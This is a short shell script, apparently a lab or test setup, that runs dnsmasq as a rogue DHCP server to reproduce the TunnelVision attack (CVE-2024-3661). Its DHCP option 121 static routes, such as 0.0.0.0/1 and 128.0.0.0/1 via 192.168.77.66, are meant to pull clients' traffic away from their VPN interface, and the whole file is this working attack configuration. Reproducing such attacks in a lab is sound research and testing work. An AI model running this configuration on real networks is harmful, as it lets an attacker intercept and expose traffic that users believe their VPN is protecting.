#!/bin/sh
# Tunnelvision (CVE-2024-3661): a rogue DHCP server pushing classless static
# routes (option 121) that try to steal traffic from the VPN interface.
set -eu
exec dnsmasq --no-daemon --port=0 --interface=eth0 --bind-interfaces \
  --dhcp-range=192.168.77.100,192.168.77.150,12h \
  --dhcp-option=3,192.168.77.66 \
  --dhcp-option=121,0.0.0.0/1,192.168.77.66,128.0.0.0/1,192.168.77.66,1.0.0.0/8,192.168.77.66,203.0.113.0/24,192.168.77.66 \
  --log-dhcp
